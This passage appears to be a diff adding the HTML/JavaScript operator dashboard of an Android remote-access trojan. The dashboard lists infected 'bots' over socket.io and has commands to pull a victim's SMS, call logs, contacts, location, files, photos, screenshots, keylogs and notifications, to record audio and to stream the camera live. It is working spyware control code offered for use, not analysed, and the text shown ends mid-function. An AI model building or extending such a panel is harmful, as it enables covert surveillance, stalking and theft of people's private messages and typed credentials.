@@ -1,0 +1,2916 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Details</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.5.0/socket.io.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        :root {
+            --bg-primary: #0f0f1a;
+            --bg-secondary: #1a1a2e;
+            --bg-card: #16213e;
+            --bg-hover: #1f2937;
+            --text-primary: #ffffff;
+            --text-secondary: #9ca3af;
+            --text-muted: #6b7280;
+            --accent-primary: #6366f1;
+            --accent-success: #10b981;
+            --accent-danger: #ef4444;
+            --border-color: #374151;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            padding: 24px;
+        }
+        
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 16px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        
+        .back-btn:hover { background: var(--bg-hover); color: var(--text-primary); }
+        
+        .device-header {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+        
+        .device-header-top {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 24px;
+        }
+        
+        .device-icon {
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .device-title h2 { font-size: 24px; margin-bottom: 4px; }
+        .device-title p { color: var(--text-muted); font-size: 14px; font-family: monospace; }
+        
+        .device-status {
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+            margin-left: auto;
+        }
+        
+        .device-status.online { background: rgba(16, 185, 129, 0.1); color: var(--accent-success); }
+        .device-status.offline { background: rgba(239, 68, 68, 0.1); color: var(--accent-danger); }
+        
+        .device-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 16px;
+        }
+        
+        .stat-item {
+            background: var(--bg-card);
+            padding: 16px;
+            border-radius: 8px;
+        }
+        
+        .stat-label { font-size: 12px; color: var(--text-muted); margin-bottom: 4px; }
+        .stat-value { font-size: 16px; font-weight: 600; }
+        
+        /* Commands Section */
+        .commands-section {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+        
+        .section-title { font-size: 18px; font-weight: 600; margin-bottom: 20px; }
+        
+        .commands-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+            gap: 12px;
+        }
+        
+        .cmd-btn {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            padding: 16px 12px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .cmd-btn:hover {
+            background: var(--bg-hover);
+            border-color: var(--accent-primary);
+        }
+        
+        .cmd-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .cmd-btn span { font-size: 12px; font-weight: 500; }
+        
+        /* Data Section */
+        .data-section {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+        
+        .data-tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .tab-btn {
+            padding: 8px 16px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            font-size: 13px;
+        }
+        
+        .tab-btn:hover { background: var(--bg-hover); }
+        .tab-btn.active { background: var(--accent-primary); color: white; border-color: var(--accent-primary); }
+        
+        .data-content {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .data-item {
+            background: var(--bg-card);
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 8px;
+        }
+        
+        .data-item-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        
+        .data-item-header strong { color: var(--text-primary); }
+        .data-item-header span { font-size: 12px; color: var(--text-muted); }
+        .data-item p { color: var(--text-secondary); font-size: 14px; }
+        
+        .empty-data {
+            text-align: center;
+            padding: 40px;
+            color: var(--text-muted);
+        }
+        
+        /* Screenshot */
+        .screenshot-container {
+            text-align: center;
+            padding: 16px;
+        }
+        
+        .screenshot-container img {
+            max-width: 100%;
+            max-height: 500px;
+            border-radius: 8px;
+        }
+        
+        /* Gallery Grid */
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 16px;
+            padding: 16px;
+        }
+        
+        .gallery-item {
+            background: var(--bg-card);
+            border-radius: 8px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        .gallery-item:hover {
+            transform: translateY(-4px);
+        }
+        
+        .gallery-item img {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+        }
+        
+        .gallery-item-info {
+            padding: 8px;
+            font-size: 12px;
+        }
+        
+        .gallery-item-name {
+            font-weight: 500;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .gallery-item-date {
+            color: var(--text-muted);
+            font-size: 11px;
+        }
+        
+        /* Image Modal */
+        .image-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+        
+        .modal-content {
+            position: relative;
+            max-width: 90%;
+            max-height: 90%;
+        }
+        
+        .modal-image {
+            max-width: 100%;
+            max-height: 80vh;
+            border-radius: 8px;
+        }
+        
+        .modal-controls {
+            display: flex;
+            gap: 12px;
+            margin-top: 16px;
+            justify-content: center;
+        }
+        
+        .modal-btn {
+            padding: 10px 20px;
+            background: var(--accent-primary);
+            border: none;
+            border-radius: 6px;
+            color: white;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        .modal-btn:hover {
+            background: #5558e3;
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: -40px;
+            right: 0;
+            font-size: 32px;
+            color: white;
+            cursor: pointer;
+            padding: 8px;
+        }
+        
+        /* Apps Grid */
+        .apps-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 16px;
+            padding: 16px;
+        }
+        
+        .app-item {
+            background: var(--bg-card);
+            border-radius: 8px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        
+        .app-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+        }
+        
+        .app-info {
+            flex: 1;
+            min-width: 0;
+        }
+        
+        .app-name {
+            font-weight: 600;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+        
+        .app-package {
+            font-size: 11px;
+            color: var(--text-muted);
+            font-family: monospace;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .app-badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: 500;
+            margin-top: 4px;
+        }
+        
+        .app-badge.system {
+            background: rgba(239, 68, 68, 0.1);
+            color: #ef4444;
+        }
+        
+        .app-badge.user {
+            background: rgba(16, 185, 129, 0.1);
+            color: #10b981;
+        }
+        
+        /* Apps Controls */
+        .apps-controls {
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            background: var(--bg-card);
+            border-radius: 8px;
+            margin: 16px;
+        }
+        
+        .apps-controls-row {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        
+        .apps-search {
+            flex: 1;
+            min-width: 250px;
+            position: relative;
+        }
+        
+        .apps-search input {
+            width: 100%;
+            padding: 10px 16px 10px 40px;
+            border: 1px solid var(--border-color);
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            border-radius: 8px;
+            font-size: 14px;
+            transition: all 0.2s;
+        }
+        
+        .apps-search input:focus {
+            outline: none;
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
+        }
+        
+        .apps-search-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-muted);
+            font-size: 16px;
+        }
+        
+        .apps-filter-group {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+        
+        .apps-filter-label {
+            font-size: 13px;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+        
+        .filter-btn {
+            padding: 8px 16px;
+            border: 1px solid var(--border-color);
+            background: var(--bg-primary);
+            color: var(--text-secondary);
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .filter-btn:hover {
+            background: var(--bg-hover);
+            border-color: var(--accent-primary);
+        }
+        
+        .filter-btn.active {
+            background: var(--accent-primary);
+            color: white;
+            border-color: var(--accent-primary);
+        }
+        
+        .apps-sort {
+            position: relative;
+        }
+        
+        .apps-sort select {
+            padding: 8px 36px 8px 16px;
+            border: 1px solid var(--border-color);
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            border-radius: 6px;
+            font-size: 13px;
+            cursor: pointer;
+            appearance: none;
+            transition: all 0.2s;
+        }
+        
+        .apps-sort select:hover {
+            border-color: var(--accent-primary);
+        }
+        
+        .apps-sort select:focus {
+            outline: none;
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
+        }
+        
+        .apps-sort::after {
+            content: '▼';
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-muted);
+            font-size: 10px;
+            pointer-events: none;
+        }
+        
+        .apps-stats {
+            font-size: 13px;
+            color: var(--text-muted);
+            padding: 0 4px;
+        }
+        
+        .apps-stats strong {
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+        
+        /* Keylog Styles */
+        .keylog-timeline {
+            padding: 16px;
+        }
+        
+        .keylog-item {
+            background: var(--bg-card);
+            border-left: 3px solid var(--accent-primary);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 12px;
+            transition: all 0.2s;
+        }
+        
+        .keylog-item:hover {
+            background: var(--bg-hover);
+            transform: translateX(4px);
+        }
+        
+        .keylog-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        
+        .keylog-app {
+            font-weight: 600;
+            color: var(--text-primary);
+            font-size: 14px;
+        }
+        
+        .keylog-time {
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+        
+        .keylog-text {
+            background: var(--bg-primary);
+            padding: 12px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 13px;
+            word-break: break-all;
+            line-height: 1.6;
+        }
+        
+        /* Notification Styles */
+        .notif-list {
+            padding: 16px;
+        }
+        
+        .notif-item {
+            background: var(--bg-card);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 12px;
+            display: flex;
+            gap: 12px;
+            transition: all 0.2s;
+        }
+        
+        .notif-item:hover {
+            background: var(--bg-hover);
+            transform: translateX(4px);
+        }
+        
+        .notif-icon {
+            width: 48px;
+            height: 48px;
+            background: var(--accent-primary);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+        
+        .notif-content {
+            flex: 1;
+            min-width: 0;
+        }
+        
+        .notif-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 4px;
+        }
+        
+        .notif-app {
+            font-weight: 600;
+            font-size: 14px;
+            color: var(--text-primary);
+        }
+        
+        .notif-time {
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+        
+        .notif-title {
+            font-weight: 500;
+            font-size: 14px;
+            margin-bottom: 4px;
+            color: var(--text-primary);
+        }
+        
+        .notif-text {
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+        }
+        
+        /* Files List */
+        .files-list {
+            padding: 16px;
+        }
+        
+        .files-breadcrumb {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 16px;
+            background: var(--bg-card);
+            border-radius: 8px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            overflow-x: auto;
+        }
+        
+        .breadcrumb-item {
+            color: var(--accent-primary);
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        
+        .breadcrumb-item:hover {
+            text-decoration: underline;
+        }
+        
+        .breadcrumb-separator {
+            color: var(--text-muted);
+        }
+        
+        .breadcrumb-current {
+            color: var(--text-primary);
+            cursor: default;
+        }
+        
+        .file-item {
+            background: var(--bg-card);
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .file-item:hover {
+            background: var(--bg-hover);
+            transform: translateX(4px);
+        }
+        
+        .file-icon {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--accent-primary);
+            border-radius: 6px;
+        }
+        
+        .file-info {
+            flex: 1;
+            min-width: 0;
+        }
+        
+        .file-name {
+            font-weight: 500;
+            font-size: 14px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .file-meta {
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+        
+        /* Loading */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--border-color);
+            border-top-color: var(--accent-primary);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        .progress-text {
+            text-align: center;
+            color: var(--text-secondary);
+            padding: 16px;
+            font-size: 14px;
+        }
+        
+        .audio-control-btn {
+            padding: 10px 16px;
+            background: #374151;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+        
+        .audio-control-btn:hover {
+            background: #4b5563;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+        
+        .audio-control-btn:active {
+            transform: translateY(0);
+        }
+        
+        .audio-player-container audio {
+            outline: none;
+            filter: brightness(1.1);
+        }
+        
+        .audio-player-container audio::-webkit-media-controls-panel {
+            background: linear-gradient(to bottom, #2d3748, #1a202c);
+        }
+        
+        .camera-action-btn {
+            padding: 16px 24px;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+        
+        .camera-action-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
+        }
+        
+        .camera-action-btn:active {
+            transform: translateY(0);
+        }
+        
+        .camera-control-btn {
+            padding: 8px 16px;
+            background: #374151;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        
+        .camera-control-btn:hover {
+            background: #4b5563;
+        }
+        
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <button class="back-btn" onclick="window.location.href='dashboard.html'">
+        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <line x1="19" y1="12" x2="5" y2="12"/>
+            <polyline points="12 19 5 12 12 5"/>
+        </svg>
+        Back to Devices
+    </button>
+    
+    <div class="device-header">
+        <div class="device-header-top">
+            <div class="device-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
+                    <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
+                    <line x1="12" y1="18" x2="12.01" y2="18"/>
+                </svg>
+            </div>
+            <div class="device-title">
+                <h2 id="deviceName">Loading...</h2>
+                <p id="deviceUid">-</p>
+            </div>
+            <div class="device-status online" id="deviceStatus">Online</div>
+        </div>
+        
+        <div class="device-stats">
+            <div class="stat-item">
+                <div class="stat-label">Android Version</div>
+                <div class="stat-value" id="androidVersion">-</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-label">Manufacturer</div>
+                <div class="stat-value" id="manufacturer">-</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-label">Battery</div>
+                <div class="stat-value" id="battery">-</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-label">Network</div>
+                <div class="stat-value" id="network">-</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-label">Phone Number</div>
+                <div class="stat-value" id="phoneNumber">-</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-label">Connected</div>
+                <div class="stat-value" id="connectedAt">-</div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="commands-section">
+        <h3 class="section-title">Commands</h3>
+        <div class="commands-grid" id="commandsGrid">
+            <!-- Commands will be rendered here -->
+        </div>
+    </div>
+    
+    <div class="data-section">
+        <h3 class="section-title">Retrieved Data</h3>
+        <div class="data-tabs" id="dataTabs">
+            <button class="tab-btn active" data-tab="sms">SMS</button>
+            <button class="tab-btn" data-tab="calls">Calls</button>
+            <button class="tab-btn" data-tab="contacts">Contacts</button>
+            <button class="tab-btn" data-tab="location">Location</button>
+            <button class="tab-btn" data-tab="apps">Apps</button>
+            <button class="tab-btn" data-tab="files">Files</button>
+            <button class="tab-btn" data-tab="photos">Photos</button>
+            <button class="tab-btn" data-tab="screenshot">Screenshot</button>
+            <button class="tab-btn" data-tab="audio">Audio</button>
+            <button class="tab-btn" data-tab="camera" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); font-weight: bold;">📷 Camera</button>
+            <button class="tab-btn" data-tab="keylog">Keylog</button>
+            <button class="tab-btn" data-tab="notifications">Notifications</button>
+        </div>
+        <div class="data-content" id="dataContent">
+            <div class="empty-data">No data yet. Click a command above to retrieve data.</div>
+        </div>
+    </div>
+
+    <script>
+        // Check authentication
+        if (localStorage.getItem('isAuthenticated') !== 'true') {
+            window.location.href = 'login.html';
+        }
+        
+        // Get device ID from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceId = urlParams.get('id');
+        
+        if (!deviceId) {
+            window.location.href = 'dashboard.html';
+        }
+        
+        let socket;
+        let currentDevice = null;
+        let deviceData = {};
+        let activeTab = 'sms';
+        let loadingCommands = {};
+        let currentFilePath = '/storage/emulated/0';
+        
+        // Apps filtering and sorting state
+        let appsFilter = 'all'; // 'all', 'user', 'system'
+        let appsSearch = '';
+        let appsSort = 'name-asc'; // 'name-asc', 'name-desc', 'size-desc', 'date-desc'
+        
+        // Keylog filtering and sorting state
+        let keylogSearch = '';
+        let keylogSort = 'date-desc'; // 'date-desc', 'date-asc', 'app-asc'
+        let keylogAppFilter = 'all';
+        
+        // Notifications filtering and sorting state
+        let notifSearch = '';
+        let notifSort = 'date-desc'; // 'date-desc', 'date-asc'
+        let notifAppFilter = 'all'; // Default Android external storage path
+        
+        const commands = [
+            { id: 'getSms', label: 'SMS', color: '#3b82f6', icon: 'M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z' },
+            { id: 'getCallLogs', label: 'Call Logs', color: '#10b981', icon: 'M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z' },
+            { id: 'getContacts', label: 'Contacts', color: '#8b5cf6', icon: 'M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2|M12 7a4 4 0 1 0-8 0 4 4 0 0 0 8 0|M23 21v-2a4 4 0 0 0-3-3.87|M16 3.13a4 4 0 0 1 0 7.75' },
+            { id: 'getLocation', label: 'Location', color: '#ef4444', icon: 'M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z|M12 7a3 3 0 1 0 0 6 3 3 0 0 0 0-6z' },
+            { id: 'takeScreenshot', label: 'Screenshot', color: '#f59e0b', icon: 'M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z|M12 17a4 4 0 1 0 0-8 4 4 0 0 0 0 8z' },
+            { id: 'getPhotos', label: 'Photos', color: '#ec4899', icon: 'M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2|M8.5 10a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3|M21 15l-5-5L5 21' },
+            { id: 'getFiles', label: 'Files', color: '#6366f1', icon: 'M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z' },
+            { id: 'getInstalledApps', label: 'Apps', color: '#14b8a6', icon: 'M3 3h7v7H3z|M14 3h7v7h-7z|M14 14h7v7h-7z|M3 14h7v7H3z' },
+            { id: 'getKeylog', label: 'Keylog', color: '#f97316', icon: 'M18 3a3 3 0 0 0-3 3v12a3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3H6a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3V6a3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3h12a3 3 0 0 0 3-3 3 3 0 0 0-3-3z' },
+            { id: 'getNotifications', label: 'Notifs', color: '#a855f7', icon: 'M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9|M13.73 21a2 2 0 0 1-3.46 0' },
+            { id: 'recordAudio', label: 'Record', color: '#06b6d4', icon: 'M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z|M19 10v2a7 7 0 0 1-14 0v-2|M12 19v4|M8 23h8' },
+            { id: 'takeCameraPhoto', label: 'Camera', color: '#84cc16', icon: 'M23 7l-7 5 7 5V7z|M14 5H3a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h11a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2z' }
+        ];
+        
+        function initSocket() {
+            socket = io('http://localhost:3001', {
+                transports: ['websocket', 'polling'],
+                reconnection: true
+            });
+            
+            socket.on('connect', () => {
+                console.log('Connected to server');
+                socket.emit('adminRegistration', { email: localStorage.getItem('adminEmail') });
+            });
+            
+            // Global WebRTC listeners - set up immediately on socket connect
+            socket.on('webrtc-offer', (data) => {
+                console.log('🎥 GLOBAL: Received webrtc-offer event:', data);
+            });
+            
+            socket.on('webrtc-ice-candidate', (data) => {
+                console.log('🧊 GLOBAL: Received webrtc-ice-candidate event:', data);
+            });
+            
+            socket.on('webrtc-error', (data) => {
+                console.log('❌ GLOBAL: Received webrtc-error event:', data);
+            });
+            
+            socket.on('botList', (bots) => {
+                const botArray = Array.isArray(bots) ? bots : (bots.bots || []);
+                currentDevice = botArray.find(b => (b.uniqueId === deviceId) || (b.uid === deviceId));
+                if (currentDevice) {
+                    renderDeviceInfo();
+                }
+            });
+            
+            socket.on('botDisconnected', (data) => {
+                if (data.uniqueId === deviceId && currentDevice) {
+                    currentDevice.online = false;
+                    renderDeviceInfo();
+                }
+            });
+            
+            // Data events
+            const dataEvents = {
+                'smsData': 'sms',
+                'callLogData': 'calls',
+                'contactsData': 'contacts',
+                'locationData': 'location',
+                'screenshot': 'screenshot'
+            };
+            
+            Object.entries(dataEvents).forEach(([event, tab]) => {
+                socket.on(event, (data) => {
+                    console.log(`Received ${event}:`, data);
+                    if (data.uniqueId === deviceId || !data.uniqueId) {
+                        deviceData[tab] = data.data || data;
+                        if (activeTab === tab) {
+                            renderData();
+                        }
+                    }
+                });
+            });
+            
+            // Handle audio recording data
+            socket.on('audioRecording', (data) => {
+                console.log('Received audioRecording:', data);
+                if (data.uniqueId === deviceId || !data.uniqueId) {
+                    const actualData = data.data || data;
+                    deviceData.audio = actualData;
+                    if (activeTab === 'audio') {
+                        renderData();
+                    }
+                    if (actualData.error) {
+                        alert(`Audio Recording Error: ${actualData.error}`);
+                    } else {
+                        alert(`✅ Audio recorded: ${actualData.fileName}\nDuration: ${actualData.duration}s\nSize: ${(actualData.fileSize / 1024).toFixed(2)} KB`);
+                    }
+                }
+            });
+            
+            // Handle camera photo data
+            socket.on('cameraPhoto', (data) => {
+                console.log('Received cameraPhoto:', data);
+                if (data.uniqueId === deviceId || !data.uniqueId) {
+                    const actualData = data.data || data;
+                    
+                    // Check if this is a live stream frame
+                    const streamContainer = document.getElementById('liveCameraStream');
+                    const feedContainer = document.getElementById('liveCameraFeed');
+                    
+                    if (liveCameraInterval && streamContainer && feedContainer && feedContainer.style.display !== 'none') {
+                        // Update live stream with new frame
+                        if (actualData.imageData && !actualData.error) {
+                            streamContainer.innerHTML = `
+                                <img src="data:image/jpeg;base64,${actualData.imageData}" 
+                                     alt="Live Camera" 
+                                     style="max-width: 100%; border-radius: 8px; display: block;">
+                                <div style="text-align: center; margin-top: 8px; color: var(--text-muted); font-size: 12px;">
+                                    Last updated: ${new Date().toLocaleTimeString()} | Camera: ${actualData.cameraType}
+                                </div>
+                            `;
+                        }
+                    } else {
+                        // Regular photo capture (not live stream)
+                        deviceData.camera = actualData;
+                        if (activeTab === 'camera') {
+                            renderData();
+                        }
+                        if (actualData.error) {
+                            alert(`Camera Error: ${actualData.error}`);
+                        } else if (!liveCameraInterval) {
+                            // Only show alert if not in live stream mode
+                            alert(`✅ Photo captured: ${actualData.fileName}\nCamera: ${actualData.cameraType}\nSize: ${(actualData.fileSize / 1024).toFixed(2)} KB`);
+                        }
+                    }
+                }
+            });
+            
+            // Handle keylog data with actions
+            socket.on('keylogData', (data) => {
+                console.log('Received keylogData:', data);
+                if (data.uniqueId === deviceId || !data.uniqueId) {
+                    const actualData = data.data || data;
+                    
+                    // Check if this is an action response
+                    if (actualData.action) {
+                        hideProgress();
+                        
+                        switch (actualData.action) {
+                            case 'get':
+                                // Store keylogs array
+                                deviceData.keylog = actualData.keylogs || [];
+                                if (activeTab === 'keylog') {
+                                    renderData();
+                                }
+                                break;
+                                
+                            case 'info':
+                                // Display storage info in alert
+                                const info = actualData.storageInfo;
+                                if (info) {
+                                    const dateRange = info.dateRange && info.dateRange.length > 0 
+                                        ? `${info.dateRange[0]} to ${info.dateRange[info.dateRange.length - 1]}`
+                                        : 'No data';
+                                    alert(`Keylog Storage Info:\n\n` +
+                                          `Total Files: ${info.totalFiles}\n` +
+                                          `Total Size: ${(info.totalSize / 1024 / 1024).toFixed(2)} MB\n` +
+                                          `Total Entries: ${info.totalEntries}\n` +
+                                          `Date Range: ${dateRange}`);
+                                }
+                                break;
+                                
+                            case 'clear':
+                                if (actualData.success) {
+                                    alert('Keylog storage cleared successfully');
+                                    deviceData.keylog = [];
+                                    if (activeTab === 'keylog') {
+                                        renderData();
+                                    }
+                                } else {
+                                    alert('Failed to clear keylog storage');
+                                }
+                                break;
+                                
+                            case 'delete':
+                                if (actualData.success) {
+                                    alert(`Deleted keylog data for ${actualData.date}`);
+                                } else {
+                                    alert('Failed to delete keylog data');
+                                }
+                                break;
+                        }
+                    } else {
+                        // Single keylog entry (real-time)
+                        if (!deviceData.keylog) deviceData.keylog = [];
+                        deviceData.keylog.push(actualData);
+                        if (activeTab === 'keylog') {
+                            renderData();
+                        }
+                    }
+                }
+            });
+            
+            // Handle notification data with actions
+            socket.on('notificationData', (data) => {
+                console.log('Received notificationData:', data);
+                if (data.uniqueId === deviceId || !data.uniqueId) {
+                    const actualData = data.data || data;
+                    
+                    // Check if this is an action response
+                    if (actualData.action) {
+                        hideProgress();
+                        
+                        switch (actualData.action) {
+                            case 'get':
+                            case 'active':
+                                // Store notifications array
+                                deviceData.notifications = actualData.notifications || [];
+                                if (activeTab === 'notifications') {
+                                    renderData();
+                                }
+                                break;
+                                
+                            case 'info':
+                                // Display storage info in alert
+                                const info = actualData.storageInfo;
+                                if (info) {
+                                    const dateRange = info.dateRange && info.dateRange.length > 0 
+                                        ? `${info.dateRange[0]} to ${info.dateRange[info.dateRange.length - 1]}`
+                                        : 'No data';
+                                    alert(`Notification Storage Info:\n\n` +
+                                          `Total Files: ${info.totalFiles}\n` +
+                                          `Total Size: ${(info.totalSize / 1024 / 1024).toFixed(2)} MB\n` +
+                                          `Total Entries: ${info.totalEntries}\n` +
+                                          `Date Range: ${dateRange}`);
+                                }
+                                break;
+                                
+                            case 'clear':
+                                if (actualData.success) {
+                                    alert('Notification storage cleared successfully');
+                                    deviceData.notifications = [];
+                                    if (activeTab === 'notifications') {
